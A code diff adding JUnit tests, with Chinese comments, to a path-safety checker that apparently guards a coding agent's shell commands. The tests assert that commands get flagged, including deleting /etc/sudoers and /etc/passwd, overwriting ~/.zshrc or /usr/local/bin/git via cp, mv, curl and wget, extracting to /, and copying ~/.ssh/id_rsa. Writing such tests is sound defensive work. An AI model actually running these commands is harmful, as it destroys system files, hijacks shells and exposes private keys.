@@ -5,6 +5,7 @@ import org.junit.jupiter.api.Test;
 
 import java.nio.file.Path;
 
+import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
@@ -177,6 +178,40 @@ class DangerousPathsTest {
         assertNotNull(DangerousPaths.checkWrite(Path.of(HOME, ".SSH", "config"), ROOT));
         assertNotNull(DangerousPaths.checkRead(Path.of(HOME, ".SSH", "ID_RSA"), ROOT));
         assertNotNull(DangerousPaths.checkWrite(ROOT.resolve(".CODETUI").resolve("permissions.json"), ROOT));
+    }
+
+    @Test
+    @DisplayName("删除目标也过 checkWrite：保护一个文件不被写，就得保护它不被删")
+    void deleteTargetsGoThroughCheckWrite() {
+        // 此前删除只走「结构位置」判定且以 -r 为门，这些全部漏过
+        assertNotNull(DangerousPaths.checkCommand("rm -f /etc/sudoers", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rm /etc/passwd", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rm -f " + HOME + "/.zshrc", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rm " + HOME + "/.bashrc", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rm -f /usr/local/bin/git", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rmdir /etc", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("rm -rf /etc/sudoers", ROOT),
+                "nameCount>=2 且非 home 形态，结构判定同样漏");
+        // 对照：项目内的日常删除不得误报，否则审批疲劳
+        assertNull(DangerousPaths.checkCommand("rm -rf target", ROOT));
+        assertNull(DangerousPaths.checkCommand("rm -f " + ROOT + "/build/out.o", ROOT));
+    }
+
+    @Test
+    @DisplayName("拷贝类命令的落点也过 checkWrite：cp 不该比 install 宽松")
+    void copyDestinationsGoThroughCheckWrite() {
+        assertNotNull(DangerousPaths.checkCommand("cp evil /usr/local/bin/git", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("cp evil " + HOME + "/.zshrc", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("mv evil " + HOME + "/.bashrc", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("curl -o /etc/sudoers http://x", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("wget -O " + HOME + "/.zshrc http://x", ROOT));
+        assertNotNull(DangerousPaths.checkCommand("tar -xf payload.tar -C /", ROOT));
+        // 对照：源是敏感文件但落点无害时，理由该来自「读」而不是「写入落点」
+        String r = DangerousPaths.checkCommand("cp " + HOME + "/.ssh/id_rsa /tmp/x", ROOT);
+        assertNotNull(r);
+        assertFalse(r.contains("写入敏感落点"), "源文件不该被误报成写入落点：" + r);
+        // 对照：项目内正常拷贝不得误报
+        assertNull(DangerousPaths.checkCommand("cp a.txt b.txt", ROOT));
     }
 
     @Test
